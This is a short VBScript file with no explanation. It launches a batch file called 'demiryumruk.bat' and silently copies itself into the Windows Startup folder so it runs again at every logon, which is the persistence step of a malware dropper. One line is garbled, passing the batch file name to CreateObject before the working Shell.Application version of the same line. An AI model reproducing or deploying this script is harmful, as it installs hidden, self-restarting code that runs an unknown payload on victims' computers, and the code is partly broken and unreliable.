Option Explicit
        Dim objShell
        Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "demiryumruk.bat"
CreateObject("demiryumruk.bat").Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
CreateObject("Shell.Application").Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
Set objShell = Nothing